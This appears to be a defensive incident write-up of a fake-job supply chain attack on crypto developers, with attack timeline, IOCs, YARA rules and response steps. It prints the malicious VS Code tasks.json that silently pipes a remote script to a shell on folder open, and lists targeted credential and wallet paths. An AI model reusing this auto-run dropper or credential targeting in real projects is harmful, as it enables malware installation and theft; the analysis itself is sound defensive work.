# AICryptoTracker Supply Chain Attack: A Case Study

## Executive Summary

In February 2026, a sophisticated social engineering and supply chain attack campaign targeted blockchain and cryptocurrency developers through fake job offers and malicious GitHub repositories. The attack techniques are consistent with those attributed to North Korean (DPRK) threat actors operating under the "Contagious Interview" campaign. Multiple infection vectors were deployed simultaneously to steal credentials, crypto wallets, and sensitive developer assets.

**Outcome**: The attack was identified during code review before the malicious payloads could execute. No credential exfiltration occurred. The forensic tools in this repository were developed as a direct result of analyzing this incident.

This document provides a detailed technical analysis of the attack chain, infection mechanisms, and recommended defensive measures.

---

## Attack Timeline

### Phase 1: Initial Contact (Social Engineering)

**Date**: February 2026  
**Method**: LinkedIn messaging

A threat actor using the alias "[Redacted]" (claiming to be CTO at [Redacted Company]) initiated contact via LinkedIn with the following approach:

> **Note**: The attacker impersonated an employee of a legitimate software development firm. The company name has been redacted to prevent unwarranted association with this attack. The real company was not involved in any way.

- **Hook**: Collaboration opportunity on an "AI-powered crypto tracker" project
- **Legitimacy markers**: 
  - Professional LinkedIn profile with relevant experience
  - Association with a real company ([Redacted Company]) with positive reviews
  - Professional documentation (CryptoTracker_Overview.pdf)
- **Financial incentive**: 
  - $250/hour rate (premium for blockchain/crypto development)
  - $10M development budget claim
  - Part-time/freelance flexibility

**Project description**: An ambitious cryptocurrency trading and asset management platform called "CryptoTracker" (also branded as "Coin Rich AI") featuring:
- AI-driven analytics and predictive models
- Blockchain integration (ERC-20/BEP-20 tokens, NFTs, staking)
- Multi-exchange portfolio management
- Real-time market data dashboards

### Phase 2: Repository Access

After initial interest, the attacker:

1. Requested the target's GitHub username
2. Sent a repository invitation to a private GitHub repository: `0xcompp/AICryptoTracker`
3. Encouraged immediate review with instructions to "run and see the project by readme file"
4. Offered support if issues arose (building false trust)

### Phase 3: Infection Triggers

Multiple infection mechanisms were deployed simultaneously:

#### Attack Vector 1: VS Code Auto-Execution via tasks.json

**Location**: `.vscode/tasks.json`

```json
{
    "version": "2.0.0",
    "tasks": [
        {
            "label": "env",
            "type": "shell",
            "osx": {
                "command": "curl https://vscode-extension-260120.vercel.app/settings/linux?flag=8 | bash"
            },
            "linux": {
                "command": "curl https://vscode-extension-260120.vercel.app/settings/linux?flag=8 | sh"
            },
            "windows": {
                "command": "curl https://vscode-extension-260120.vercel.app/settings/win?flag=8 | cmd"
            },
            "problemMatcher": [],
            "presentation": {
                "reveal": "never",
                "echo": false,
                "focus": false,
                "close": true,
                "panel": "dedicated",
                "showReuseMessage": false
            },
            "runOptions": {
                "runOn": "folderOpen"
            }
        }
    ]
}
```

**Technical details**:
- Executes automatically when the folder is opened in VS Code (`"runOn": "folderOpen"`)
- Platform-specific curl-pipe-to-shell commands
- Silent execution (all presentation flags set to hide terminal output)
- Fetches and executes remote scripts from Vercel-hosted domain

**Payload delivery**: The Vercel endpoint (`https://vscode-extension-260120.vercel.app/`) serves platform-specific malware droppers.

#### Attack Vector 2: Obfuscated Backdoor in PostCSS Configuration

**Location**: `postcss.config.js`

The file appears as a normal PostCSS configuration for the first 7 lines, but contains hundreds of whitespace characters hiding a massive obfuscated JavaScript payload.

**Characteristics**:
- Uses `createRequire` from Node.js `module` API (abnormal for frontend config)
- Heavy use of `String.fromCharCode()` for obfuscation
- Hex-encoded strings and self-executing anonymous functions
- Injects `require` into global scope for arbitrary module loading
- Executes on every `npm run dev` or `npm run build` command

**Purpose**: Persistence mechanism that runs malicious code during normal development workflow.

#### Attack Vector 3: Trojanized npm Package

**Package**: `react-svg-helper-fast` version 1.0.0

Listed in `package.json` dependencies:
```json
"react-svg-helper-fast": "1.0.0"
```

This package is a documented infostealer, part of a campaign involving 197+ malicious npm packages.

**Malicious dependencies**:

| Dependency | Purpose |
|------------|---------|
| `@primno/dpapi` | Decrypts Windows DPAPI-protected browser passwords and cookies |
| `better-sqlite3` | Reads credential databases from Chrome, Edge, Firefox, Opera |
| `node-machine-id` | Device fingerprinting for tracking victims |
| `socket.io-client` | Real-time WebSocket connection to attacker C2 servers for exfiltration |
| `request` / `axios` | HTTP-based data exfiltration |
| `express` | Possible local HTTP server for remote access |

**Installation behavior**:
- Post-install hooks execute immediately upon `npm install`
- Scans for and exfiltrates:
  - Browser credential databases
  - Saved passwords and session cookies
  - Crypto wallet files and browser extensions (MetaMask, Phantom, Coinbase, etc.)
  - SSH keys (`~/.ssh/`)
  - Git credentials (`~/.git-credentials`)
  - npm tokens (`~/.npmrc`)
  - Environment variables and `.env` files

#### Attack Vector 4: Committed Secrets

**File**: `.env` (committed to repository)

Contains exposed API keys such as:
```
CLERK_SECRET_KEY=...
```

**Purpose**: Either bait to make the project appear legitimate or leftover from attacker's test environment. Legitimate projects should never commit secrets.

### Phase 4: Verification and Exfiltration

After the victim opens the repository, the attacker requests a "dashboard screenshot" to:

1. **Confirm execution**: Verify that the malware is running and has access to the victim's environment
2. **Target validation**: Screenshots may capture open crypto wallets, exchange accounts, or trading dashboards
3. **Social engineering continuity**: Maintains the facade of legitimate project review
4. **Credential harvesting**: The screenshot request itself serves as a test for the infostealer's screen capture functionality

---

## Technical Indicators of Compromise

### Network Indicators

**Command & Control Infrastructure**:
```
198.105.127.210:443 (HTTPS)
```
- Linked to North Korean (DPRK) malware campaigns
- Associated with Contagious Interview / Popper.js-related droppers
- Used for credential exfiltration and remote access trojan (RAT) C2

**Malicious domains**:
```
vscode-extension-260120.vercel.app
```
- Vercel-hosted dropper (free hosting, easy to rotate domains)
- Serves platform-specific malware payloads
- Part of documented 2025-2026 developer-targeting campaigns

> **Note**: This specific domain may be taken down or rotated. The persistent indicator is the naming pattern `vscode-extension-XXXXXX.vercel.app` used across multiple attacks in this campaign.

### File System Indicators

**Malicious files**:
- `.vscode/tasks.json` with `"runOn": "folderOpen"` and curl-pipe-to-shell commands
- `postcss.config.js` with obfuscated JavaScript payload after line 8
- `node_modules/react-svg-helper-fast/` package directory
- Copies of browser credential databases in temp directories
- Unexpected processes: `node.exe` with outbound connections to unknown IPs

**Targeted data**:
- Browser databases:
  - `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`
  - `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies`
  - `%LOCALAPPDATA%\Google\Chrome\User Data\Local State`
  - `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data`
  - `%APPDATA%\Opera Software\Opera Stable\Login Data`

- Crypto wallets:
  - `%APPDATA%\Exodus`
  - `%APPDATA%\Ethereum`
  - `%APPDATA%\MetaMask`
  - `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Extension Settings`

- Developer credentials:
  - `%USERPROFILE%\.ssh\*` (SSH keys)
  - `%USERPROFILE%\.git-credentials` (plaintext Git tokens)
  - `%USERPROFILE%\.npmrc` (npm auth tokens)
  - `%APPDATA%\GitHub CLI\*` (GitHub CLI tokens)

### Execution Evidence

**PowerShell Script Block Logs**:
- Event ID 4104 (Microsoft-Windows-PowerShell/Operational)
- Suspicious patterns: `curl`, `dpapi`, `sqlite`, `fromCharCode`, `credential`

**Prefetch files**:
- `node.exe`, `curl.exe`, `cmd.exe` execution traces in `C:\Windows\Prefetch\*.pf`

**Browser credential database access timestamps**:
- Recent LastAccessTime and LastWriteTime on Login Data files
- Correlates with repository clone/execution timeframe

---

## Attack Attribution

### Campaign: Contagious Interview

**Assessment**: The techniques, tactics, and infrastructure used in this attack are consistent with those publicly attributed to North Korean state-sponsored threat actors (Lazarus Group / APT38) by multiple security research organizations. This attribution is based on pattern matching with documented campaigns and should not be considered a definitive forensic conclusion.

**Campaign characteristics**:
- Targets blockchain, cryptocurrency, and Web3 developers
- Uses fake job offers and freelance opportunities as lures
- Documented wave of 197+ trojanized npm packages (2025-2026)
- Variants include BeaverTail, InvisibleFerret, OtterCookie infostealers
- Infrastructure: Vercel/Netlify-hosted droppers, rotating C2 domains

**Similar packages in campaign**:
- `react-svg-helper-fast`
- `react-svgs-helper`
- `inline-react-svg`
- `rest-icon-moduler`
- `vue-helper-auth`
- `node-hide-console-windows`

**Motivation**: Financial gain through cryptocurrency theft, credential harvesting, and supply chain compromise.

---

## Attack Vectors Summary

| # | Vector | Trigger | Mechanism | Evasion |
|---|--------|---------|-----------|----------|
| 1 | Social Engineering | LinkedIn message | Fake job offer ($250/hr), impersonation of real company | Professional docs, gradual trust building |
| 2 | VS Code Auto-Execution | Opening folder | `.vscode/tasks.json` with `runOn: folderOpen` | Hidden terminal, silent curl-pipe-to-shell |
| 3 | npm Supply Chain | `npm install` | Trojanized `react-svg-helper-fast` post-install hooks | Disguised as UI helper library |
| 4 | Build Tool Hijacking | `npm run dev/build` | Obfuscated payload in `postcss.config.js` | Whitespace hiding, `String.fromCharCode` |
| 5 | Recon & Validation | Screenshot request | Confirm infection, identify high-value targets | Maintains social engineering facade |

For detailed technical analysis of each vector, see [Phase 3: Infection Triggers](#phase-3-infection-triggers) above.

---

## Defensive Measures

### Prevention

1. **Repository Review Procedures**
   - Never trust workspaces automatically in VS Code
   - Review `.vscode/tasks.json` before opening folders
   - Use restricted mode for unfamiliar repositories
   - Disable auto-task execution: `"task.allowAutomaticTasks": "off"` in VS Code settings

2. **Dependency Security**
   - Use `npm install --ignore-scripts` for untrusted packages
   - Scan dependencies with tools: Socket.dev, Snyk, npm audit
   - Review package.json for unfamiliar or suspicious packages
   - Check npm package age, maintainers, and download statistics

3. **Social Engineering Awareness**
   - Verify recruiters through official company channels
   - Be suspicious of unsolicited high-paying opportunities
   - Demand formal contracts before any code review
   - Research projects independently (web searches, GitHub public presence)

4. **Environment Isolation**
   - Use virtual machines or containers for untrusted code review
   - Maintain separate development environments for crypto/sensitive work
   - Use hardware security keys for high-value accounts
   - Never keep crypto wallets on development machines

### Detection

1. **File Monitoring**
   - Monitor `.vscode/` directory for suspicious task configurations
   - Alert on PostCSS/Webpack/Vite config files with unusual size or obfuscation
   - Track access times on browser credential databases

2. **Network Monitoring**
   - Alert on outbound connections from `node.exe` to unknown IPs
   - Monitor for curl/wget execution in development contexts
   - Track DNS queries to Vercel/Netlify domains from development tools

3. **Endpoint Detection**
   - Enable PowerShell script block logging (Event ID 4104)
   - Monitor for suspicious process chains: `vscode.exe` → `node.exe` → network
   - Use EDR solutions with behavioral detection for credential access patterns

### Response

If compromise is suspected:

1. **Immediate Actions**
   - Disconnect affected machine from network
   - Kill suspicious `node.exe` processes
   - Delete repository folder and `node_modules`
   - Clear npm cache: `npm cache clean --force`

2. **Credential Rotation** (from clean device)
   - Change all browser-saved passwords
   - Revoke GitHub tokens and SSH keys
   - Rotate API keys and service credentials
   - Enable 2FA/hardware keys on all accounts
   - Transfer cryptocurrency to new wallets

3. **Forensics and Cleanup**
   - Run anti-malware scans (Malwarebytes, ESET, Windows Defender offline scan)
   - Review event logs for suspicious activity
   - Monitor accounts for unauthorized access
   - Consider full system wipe/reinstall for high-value targets

4. **Reporting**
   - Report malicious repositories to GitHub Security
   - Report fake profiles to LinkedIn
   - Report npm packages to npm security team
   - File reports with FBI IC3 (ic3.gov) for financial crimes
   - Share IOCs with security community

### Recommended VS Code Security Settings

```json
{
  "task.allowAutomaticTasks": "off",
  "security.workspace.trust.enabled": true,
  "extensions.autoUpdate": false
}
```

### Pre-Repository Review Checklist

- [ ] Verify recruiter/company legitimacy independently
- [ ] Search for public information about the project
- [ ] Check for red flags: too-good-to-be-true pay, rushed timeline, vague scope
- [ ] Open repository in restricted mode first
- [ ] Review `.vscode/tasks.json` for auto-execution
- [ ] Inspect `package.json` for suspicious dependencies
- [ ] Check build configs (`postcss.config.js`, `vite.config.js`, etc.) for obfuscation
- [ ] Use `npm install --ignore-scripts` for initial review
- [ ] Run security scanners (Socket.dev, Snyk) before installation
- [ ] Use VM/sandbox for untrusted code

---

## Indicators of Compromise (IOCs)

### Network
```
198.105.127.210:443
vscode-extension-260120.vercel.app
```

### Malicious Package
- **Name**: `react-svg-helper-fast@1.0.0`
- **Registry**: npm (reported and removed)
- **Repository**: `0xcompp/AICryptoTracker` (GitHub, reported)

### YARA Rules

```yara
rule VSCode_Task_AutoExec_CurlPipeShell
{
    meta:
        description = "Detects malicious VS Code tasks.json with auto-execution and curl-pipe-to-shell"
        reference = "AICryptoTracker Supply Chain Attack"
        date = "2026-02-14"
    
    strings:
        $json_version = "\"version\": \"2.0.0\""
        $run_on_open = "\"runOn\": \"folderOpen\""
        $curl_pipe = /curl\s+http[^\s]+\s+\|\s+(bash|sh|cmd)/
        $hidden_terminal = "\"reveal\": \"never\""
    
    condition:
        filesize < 5KB and
        (filename matches /tasks\.json$/) and
        all of them
}

rule NPM_Infostealer_Dependencies
{
    meta:
        description = "Detects package.json with credential-stealing dependencies"
        reference = "Contagious Interview Campaign"
        date = "2026-02-14"
    
    strings:
        $dpapi = "@primno/dpapi"
        $sqlite = "better-sqlite3"
        $machine_id = "node-machine-id"
        $socket_io = "socket.io-client"
        $react_svg = "react-svg-helper-fast"
    
    condition:
        ($dpapi and $sqlite and $machine_id) or $react_svg
}
```

---

## Conclusion

The AICryptoTracker supply chain attack demonstrates the sophistication and persistence of modern social engineering campaigns targeting high-value developer communities. By combining legitimate-looking job offers, multi-stage malware delivery, and advanced evasion techniques, threat actors successfully bypassed traditional security awareness and tooling.

The attack highlights critical vulnerabilities in developer workflows:
- Trust in professional networking platforms (LinkedIn)
- Automatic task execution in development tools (VS Code)
- npm package ecosystem trust model
- Co-location of crypto assets and development environments

Organizations and individual developers must adopt defense-in-depth strategies, maintain healthy skepticism of unsolicited opportunities, and implement strict code review procedures for all untrusted sources.

---

## References

- [Socket.dev: Lazarus Group Deploys 200+ Malicious npm Packages](https://socket.dev/blog/lazarus-npm-campaign) — Contagious Interview campaign analysis
- [Snyk Vulnerability Database: react-svg-helper-fast](https://security.snyk.io/package/npm/react-svg-helper-fast) — Package advisory
- [Microsoft: VS Code Workspace Trust](https://code.visualstudio.com/docs/editor/workspace-trust) — Workspace Trust documentation
- [CISA: TraderTraitor - North Korean State-Sponsored Actors Targeting Blockchain](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-108a) — DPRK targeting advisory
- [GitHub Security Lab: Supply Chain Attack Prevention](https://securitylab.github.com/) — Security research and tooling
